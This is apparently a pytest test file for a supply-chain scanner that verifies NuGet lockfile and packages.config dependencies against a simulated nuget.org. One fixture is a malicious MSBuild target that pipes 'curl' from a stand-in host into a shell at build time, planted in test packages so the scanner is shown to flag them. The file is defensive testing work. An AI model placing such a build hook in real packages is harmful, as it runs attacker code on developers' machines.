"""buckthorn check on packages.lock.json and packages.config, with a fake nuget.org.

Every package here is a synthetic zip built in the test: nothing is downloaded.
"""

import base64
import hashlib
import io
import json
import zipfile

import pytest

from buckthorn import lock
from buckthorn.cli import main
from buckthorn.findings import verdict

FLAT = "https://api.nuget.org/v3-flatcontainer"
NUSPEC = (
    '<?xml version="1.0"?>\n'
    '<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">'
    "<metadata><id>{id}</id><version>{version}</version><authors>a</authors>"
    "<description>d</description></metadata></package>"
)
EXEC_TARGETS = (
    '<Project><Target Name="Fetch" BeforeTargets="Build">'
    '<Exec Command="curl -s https://x.example/a | sh" /></Target></Project>'
)
SIGNATURE = ".signature.p7s"


def _zip(members: list[tuple[str, bytes]]) -> bytes:
    """A zip with fixed timestamps, so the same members give the same bytes."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in members:
            zf.writestr(zipfile.ZipInfo(name, date_time=(2020, 1, 1, 0, 0, 0)), data)
    return buf.getvalue()


def _members(package_id: str, version: str, files: dict[str, str] | None = None):
    members = [(f"{package_id}.nuspec", NUSPEC.format(id=package_id, version=version).encode())]
    return members + [(k, v.encode()) for k, v in (files or {}).items()]


def _b64(digest: bytes) -> str:
    return base64.b64encode(digest).decode()


class FakeNuGet:
    """Serves .nupkg files at their flat container URL and counts calls."""

    def __init__(self):
        self.files: dict[str, bytes] = {}
        self.calls: list[str] = []

    def add(self, package_id, version, files=None, signed=False) -> str:
        """Serve the package; return the contentHash a lockfile would pin."""
        members = _members(package_id, version, files)
        unsigned = _zip(members)
        served = _zip(members + [(SIGNATURE, b"repository signature")]) if signed else unsigned
        low = f"{package_id}.{version}".lower()
        self.files[f"{FLAT}/{package_id.lower()}/{version.lower()}/{low}.nupkg"] = served
        return _b64(hashlib.sha512(unsigned).digest())

    def __call__(self, url: str, max_bytes: int) -> bytes:
        self.calls.append(url)
        if url in self.files:
            return self.files[url]
        raise lock.FetchError(f"404 {url}")


@pytest.fixture
def nuget():
    return FakeNuGet()


def _lockfile(tmp_path, targets: dict, version: int = 1):
    path = tmp_path / "packages.lock.json"
    if version >= 3:
        data = {"version": version} | {
            alias: {"framework": alias, "dependencies": deps} for alias, deps in targets.items()
        }
    else:
        data = {"version": version, "dependencies": targets}
    path.write_text(json.dumps(data))
    return path


def _entry(content_hash: str, version: str = "1.0.0", kind: str = "Direct") -> dict:
    return {
        "type": kind,
        "requested": f"[{version}, )",
        "resolved": version,
        "contentHash": content_hash,
    }


def _config(tmp_path, packages: list[tuple[str, str]], raw: str | None = None):
    path = tmp_path / "packages.config"
    rows = "".join(
        f'<package id="{i}" version="{v}" targetFramework="net48" />' for i, v in packages
    )
    path.write_text(raw or f'<?xml version="1.0" encoding="utf-8"?><packages>{rows}</packages>')
    return path


def _summary(results):
    return sorted((r.path, verdict(r.findings)) for r in results)


def _rules(result):
    return sorted(f.rule_id for f in result.findings)


# NuGet's content hash, ported from NuGet.Client SignedPackageArchiveUtility.


def test_content_hash_of_an_unsigned_package_is_its_sha512():
    data = _zip(_members("Pkg", "1.0.0"))
    assert lock.nuget_content_hash(data) == hashlib.sha512(data).hexdigest()


def test_content_hash_of_a_signed_package_is_the_hash_before_signing():
    members = _members("Pkg", "1.0.0", {"lib/net8.0/Pkg.dll": "MZ"})
    signed = _zip(members + [(SIGNATURE, b"sig")])
    assert lock.nuget_content_hash(signed) == hashlib.sha512(_zip(members)).hexdigest()


def test_content_hash_drops_a_signature_that_is_not_the_last_entry():
    # Every later entry moves back: its offset is rewritten before it is hashed.
    members = _members("Pkg", "1.0.0", {"build/Pkg.targets": "<Project />", "a.txt": "x" * 500})
    signed = _zip([(SIGNATURE, b"signature bytes")] + members)
    assert lock.nuget_content_hash(signed) == hashlib.sha512(_zip(members)).hexdigest()


@pytest.mark.parametrize(
    "data",
    [
        b"not a zip",
        _zip([(SIGNATURE, b"one"), (SIGNATURE, b"two"), ("Pkg.nuspec", b"<package />")]),
    ],
    ids=["not-a-zip", "two-signatures"],
)
def test_content_hash_of_a_package_nuget_would_refuse_is_an_error(data):
    with pytest.raises(ValueError):
        lock.nuget_content_hash(data)


def test_zip_python_will_not_open_is_an_error_not_a_crash():
    data = bytearray(_zip(_members("Pkg", "1.0.0") + [(SIGNATURE, b"sig")]))
    data[data.find(b"PK\x01\x02") + 6] = 0xFF  # "version needed to extract": 25.5
    with pytest.raises(ValueError):
        lock.nuget_content_hash(bytes(data))


# packages.lock.json


def test_lockfile_packages_are_fetched_from_nuget_org_and_checked(tmp_path, nuget):
    deps = {
        "Direct.Pkg": _entry(nuget.add("Direct.Pkg", "1.0.0")),
        "Transitive.Pkg": _entry(
            nuget.add("Transitive.Pkg", "2.1.0", signed=True), "2.1.0", "Transitive"
        ),
        "MyLib": {"type": "Project", "dependencies": {"Direct.Pkg": "[1.0.0, )"}},
    }
    path = _lockfile(tmp_path, {"net8.0": deps})
    results = lock.check(path, fetch=nuget, cache_dir=tmp_path / "cache")
    assert _summary(results) == [
        ("Direct.Pkg.1.0.0.nupkg", "clean"),
        ("Transitive.Pkg.2.1.0.nupkg", "clean"),
    ]
    assert sorted(nuget.calls) == [
        f"{FLAT}/direct.pkg/1.0.0/direct.pkg.1.0.0.nupkg",
        f"{FLAT}/transitive.pkg/2.1.0/transitive.pkg.2.1.0.nupkg",
    ]


def test_lockfile_package_that_runs_code_at_build_is_flagged(tmp_path, nuget):
    pin = nuget.add("Evil", "1.0.0", {"build/Evil.targets": EXEC_TARGETS}, signed=True)
    path = _lockfile(tmp_path, {"net8.0": {"Evil": _entry(pin)}})
    (result,) = lock.check(path, fetch=nuget, cache_dir=tmp_path / "cache")
    assert verdict(result.findings) == "flagged"
    assert "BKT-LOCK-001" not in _rules(result)


def test_lockfile_hash_mismatch_is_flagged_and_not_scanned(tmp_path, nuget):
    nuget.add("Pkg", "1.0.0", {"build/Pkg.targets": EXEC_TARGETS})
    other = _b64(hashlib.sha512(b"what the lockfile saw").digest())
    path = _lockfile(tmp_path, {"net8.0": {"Pkg": _entry(other)}})
    (result,) = lock.check(path, fetch=nuget, cache_dir=tmp_path / "cache")
    assert _rules(result) == ["BKT-LOCK-001"]


def test_lockfile_version_3_targets_are_read(tmp_path, nuget):
    pin = nuget.add("Pkg", "1.0.0")
    path = _lockfile(tmp_path, {"net8.0": {"Pkg": _entry(pin)}}, version=3)
    assert _summary(lock.check(path, fetch=nuget)) == [("Pkg.1.0.0.nupkg", "clean")]


def test_same_package_in_several_targets_is_fetched_once(tmp_path, nuget):
    pin = nuget.add("Pkg", "1.0.0")
    targets = {t: {"Pkg": _entry(pin)} for t in ("net48", "net8.0", "net8.0/win-x64")}
    path = _lockfile(tmp_path, targets)
    assert len(lock.check(path, fetch=nuget)) == 1
    assert len(nuget.calls) == 1


def test_same_package_in_another_case_is_fetched_once(tmp_path, nuget):
    nuget.add("Pkg", "1.0.0")
    path = _config(tmp_path, [("Pkg", "1.0.0"), ("pkg", "1.0")])
    assert len(lock.check(path, fetch=nuget)) == 1


def test_same_package_with_two_hashes_is_checked_against_both(tmp_path, nuget):
    pin = nuget.add("Pkg", "1.0.0")
    other = _b64(hashlib.sha512(b"other").digest())
    path = _lockfile(tmp_path, {"net48": {"Pkg": _entry(pin)}, "net8.0": {"Pkg": _entry(other)}})
    results = lock.check(path, fetch=nuget, cache_dir=tmp_path / "cache")
    assert sorted(verdict(r.findings) for r in results) == ["clean", "flagged"]


@pytest.mark.parametrize(
    ("resolved", "url_version"),
    [
        ("1.0", "1.0.0"),
        ("1.0.0.0", "1.0.0"),
        ("1.0.0+build.5", "1.0.0"),
        ("1.0.0-Beta.1", "1.0.0-beta.1"),
        ("01.2.3.4", "1.2.3.4"),
    ],
)
def test_version_is_normalized_as_nuget_names_the_file(tmp_path, resolved, url_version):
    data = _zip(_members("Pkg", url_version))
    url = f"{FLAT}/pkg/{url_version}/pkg.{url_version}.nupkg"
    calls = []

    def fetch(u, _max):
        calls.append(u)
        return data

    pin = _b64(hashlib.sha512(data).digest())
    path = _lockfile(tmp_path, {"net8.0": {"Pkg": _entry(pin, resolved)}})
    lock.check(path, fetch=fetch)
    assert calls == [url]


@pytest.mark.parametrize(
    "entry",
    [
        {"type": "Direct", "resolved": "1.0.0"},  # no contentHash
        {"type": "Direct", "resolved": "1.0.0", "contentHash": "sha512-abc"},
        {"type": "Direct", "resolved": "[1.0.0, )", "contentHash": _b64(bytes(64))},
        {"type": "Direct", "contentHash": _b64(bytes(64))},  # no resolved version
        "1.0.0",
    ],
    ids=["no-hash", "bad-hash", "range", "no-version", "not-an-object"],
)
def test_lockfile_entries_that_cannot_be_checked_are_not_verified(tmp_path, nuget, entry):
    path = _lockfile(tmp_path, {"net8.0": {"Pkg": entry}})
    (result,) = lock.check(path, fetch=nuget)
    assert _rules(result) == ["BKT-LOCK-002"]
    assert nuget.calls == []


@pytest.mark.parametrize("package_id", ["../evil", "a/b", "Pkg%2F..", "x" * 101, "", "Pkg\n"])
def test_ids_that_are_not_plain_are_refused_before_fetching(tmp_path, nuget, package_id):
    path = _lockfile(tmp_path, {"net8.0": {package_id: _entry(_b64(bytes(64)))}})
    (result,) = lock.check(path, fetch=nuget)
    assert _rules(result) == ["BKT-LOCK-002"]
    assert nuget.calls == []


@pytest.mark.parametrize(
    "data",
    [
        {"version": 9, "dependencies": {}},
        {"dependencies": {}},
        [],
        {"version": 1, "dependencies": []},
    ],
)
def test_lockfile_shapes_buckthorn_does_not_know_are_not_verified(tmp_path, nuget, data):
    path = tmp_path / "packages.lock.json"
    path.write_text(json.dumps(data))
    (result,) = lock.check(path, fetch=nuget)
    assert _rules(result) == ["BKT-LOCK-002"]


def test_package_not_on_nuget_org_is_not_verified(tmp_path, nuget):
    path = _lockfile(tmp_path, {"net8.0": {"Private.Pkg": _entry(_b64(bytes(64)))}})
    (result,) = lock.check(path, fetch=nuget)
    assert _rules(result) == ["BKT-LOCK-002"]


def test_signed_package_nuget_would_refuse_is_not_verified(tmp_path):
    members = _members("Pkg", "1.0.0")
    data = _zip([(SIGNATURE, b"1"), (SIGNATURE, b"2")] + members)
    path = _lockfile(tmp_path, {"net8.0": {"Pkg": _entry(_b64(hashlib.sha512(data).digest()))}})
    (result,) = lock.check(path, fetch=lambda u, m: data)
    assert _rules(result) == ["BKT-LOCK-002"]


def test_cache_means_one_download_for_a_signed_package(tmp_path, nuget):
    pin = nuget.add("Pkg", "1.0.0", signed=True)
    path = _lockfile(tmp_path, {"net8.0": {"Pkg": _entry(pin)}})
    lock.check(path, fetch=nuget, cache_dir=tmp_path / "cache")
    lock.check(path, fetch=nuget, cache_dir=tmp_path / "cache")
    assert len(nuget.calls) == 1


# packages.config


def test_packages_config_scans_what_nuget_org_serves_and_says_it_was_not_pinned(tmp_path, nuget):
    nuget.add("Old.Pkg", "4.5.0", signed=True)
    nuget.add("Evil", "1.0.0", {"build/Evil.targets": EXEC_TARGETS})
    path = _config(tmp_path, [("Old.Pkg", "4.5.0"), ("Evil", "1.0.0")])
    results = {r.path: r for r in lock.check(path, fetch=nuget)}
    assert _rules(results["Old.Pkg.4.5.0.nupkg"]) == ["BKT-LOCK-004"]
    assert verdict(results["Old.Pkg.4.5.0.nupkg"].findings) == "clean"
    assert verdict(results["Evil.1.0.0.nupkg"].findings) == "flagged"


@pytest.mark.parametrize(
    "raw",
    [
        '<!DOCTYPE packages [<!ENTITY x "y">]><packages />',
        "<packages><package id=",
        "<project />",
    ],
    ids=["doctype", "broken", "wrong-root"],
)
def test_packages_config_that_is_not_read_is_not_verified(tmp_path, nuget, raw):
    (result,) = lock.check(_config(tmp_path, [], raw), fetch=nuget)
    assert _rules(result) == ["BKT-LOCK-002"]


@pytest.mark.parametrize(
    ("package_id", "version"), [("Pkg", ""), ("", "1.0.0"), ("Pkg", "[1.0,2.0)")]
)
def test_packages_config_rows_that_cannot_be_checked_are_not_verified(
    tmp_path, nuget, package_id, version
):
    (result,) = lock.check(_config(tmp_path, [(package_id, version)]), fetch=nuget)
    assert _rules(result) == ["BKT-LOCK-002"]
    assert nuget.calls == []


def test_check_command_reads_nuget_lockfiles_not_as_mcp_configs(tmp_path, monkeypatch, capsys):
    # An "mcpServers" key added to a lockfile must not make it an empty config.
    path = tmp_path / "packages.lock.json"
    path.write_text(
        json.dumps(
            {
                "version": 1,
                "mcpServers": {},
                "dependencies": {"net8.0": {"Pkg": _entry(_b64(bytes(64)))}},
            }
        )
    )
    monkeypatch.setattr(lock, "fetch_url", FakeNuGet())
    assert main(["check", str(path), "--format", "json"]) != 0
    assert "BKT-LOCK-002" in capsys.readouterr().out
